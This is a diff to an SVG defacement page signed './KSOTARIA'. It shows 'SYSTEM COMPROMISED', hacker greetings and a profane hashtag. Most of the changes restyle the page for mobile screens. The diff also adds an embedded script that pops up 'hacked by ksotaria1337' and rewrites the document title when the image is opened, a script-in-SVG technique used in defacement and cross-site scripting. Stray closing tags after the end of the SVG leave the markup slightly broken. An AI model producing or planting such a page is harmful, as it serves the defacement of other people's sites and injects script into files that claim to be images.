@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
   <rect width="100%" height="100%" fill="#000" />
   
   <foreignObject width="100%" height="100%">
@@ -7,103 +7,120 @@
       <style>
         @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&amp;display=swap');
 
+        * { box-sizing: border-box; }
+        
         body {
           background: #000;
           color: #f00;
           font-family: 'Courier Prime', monospace;
           margin: 0;
+          padding: 20px;
           display: flex;
+          flex-direction: column;
           justify-content: center;
           align-items: center;
-          height: 100vh;
+          min-height: 100vh;
           overflow: hidden;
           text-align: center;
         }
 
-        .glitch-container {
-          position: relative;
+        .glitch-wrapper {
+          width: 100%;
+          max-width: 100vw;
         }
 
-        /* Efek Glitch Utama */
+        /* Responsive Text: Mengecil di HP, Besar di PC */
         .main-title {
-          font-size: 80px;
+          font-size: 12vw; 
           position: relative;
           color: white;
-          letter-spacing: 10px;
+          letter-spacing: 5px;
+          margin: 0;
           animation: glitch 1s linear infinite;
+          word-wrap: break-word;
         }
 
+        @media (min-width: 800px) {
+          .main-title { font-size: 80px; }
+        }
+
+        /* Glitch Effect Layers */
         .main-title::before, .main-title::after {
           content: "./KSOTARIA";
           position: absolute;
           top: 0; left: 0; width: 100%; height: 100%;
           background: black;
+          opacity: 0.8;
         }
 
         .main-title::before {
-          left: 2px;
-          text-shadow: -2px 0 #ff00c1;
-          clip: rect(44px, 450px, 56px, 0);
+          left: 3px;
+          text-shadow: -3px 0 #ff00c1;
+          clip: rect(44px, 900px, 56px, 0);
           animation: glitch-anim 5s infinite linear alternate-reverse;
         }
 
         .main-title::after {
-          left: -2px;
-          text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1;
+          left: -3px;
+          text-shadow: -3px 0 #00fff9;
+          clip: rect(10px, 900px, 30px, 0);
           animation: glitch-anim2 1s infinite linear alternate-reverse;
         }
 
         .info-box {
-          border: 1px solid #f00;
-          padding: 20px;
+          border: 2px solid #f00;
+          padding: 15px;
           margin-top: 20px;
           background: rgba(255, 0, 0, 0.1);
-          box-shadow: 0 0 20px #f00;
-          animation: blink 0.1s infinite;
+          box-shadow: 0 0 15px #f00;
+          width: 90%;
+          max-width: 500px;
+          animation: blink 0.2s infinite;
         }
 
-        .status { color: #fff; text-shadow: 0 0 5px #f00; }
+        .status { 
+          color: #fff; 
+          font-size: 1rem;
+          text-shadow: 0 0 5px #f00; 
+          margin: 5px 0;
+        }
 
         @keyframes glitch-anim {
-          0% { clip: rect(31px, 9999px, 94px, 0); }
-          20% { clip: rect(62px, 9999px, 42px, 0); }
-          40% { clip: rect(15px, 9999px, 61px, 0); }
-          60% { clip: rect(80px, 9999px, 5px, 0); }
-          80% { clip: rect(44px, 9999px, 88px, 0); }
-          100% { clip: rect(12px, 9999px, 31px, 0); }
+          0% { clip: rect(31px, 999px, 94px, 0); }
+          100% { clip: rect(12px, 999px, 31px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+          0% { clip: rect(10px, 999px, 50px, 0); }
+          100% { clip: rect(40px, 999px, 80px, 0); }
         }
 
         @keyframes blink {
-          0% { opacity: 1; }
-          50% { opacity: 0.8; }
-          100% { opacity: 1; }
-        }
-
-        .scanline {
-          width: 100%; height: 100px;
-          z-index: 10;
-          background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(255, 0, 0, 0.2) 50%, rgba(0, 0, 0, 0) 100%);
-          opacity: 0.1;
-          position: absolute;
-          bottom: 100%;
-          animation: scanline 3s linear infinite;
-        }
-
-        @keyframes scanline {
-          0% { bottom: 100%; }
-          100% { bottom: -100%; }
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.9; }
         }
       </style>
 
-      <div class="scanline"></div>
-      <div class="glitch-container">
+      <div class="glitch-wrapper">
         <h1 class="main-title">./KSOTARIA</h1>
         <div class="info-box">
-          <p class="status">STATUS: SYSTEM COMPROMISED BY 1337</p>
-          <p>[ GREETZ: ALL INDONESIAN HACKER ]</p>
-          <p style="color: #555;">#FuckYou_Mafia</p>
+          <p class="status">STATUS: SYSTEM COMPROMISED</p>
+          <p style="font-size: 0.9rem;">[ GREETZ: ALL INDO HACKER ]</p>
+          <p style="color: #444; font-size: 0.8rem;">#FuckYou_Mafia</p>
         </div>
       </div>
+    </div>
+  </foreignObject>
+
+  <script type="text/javascript">
+    <![CDATA[
+      try {
+        alert("hacked by ksotaria1337");
+        document.title = "HACKED BY KSOTARIA";
+      } catch(e) {}
+    ]]>
+  </script>
+</svg>
     </div>
   </foreignObject>
 
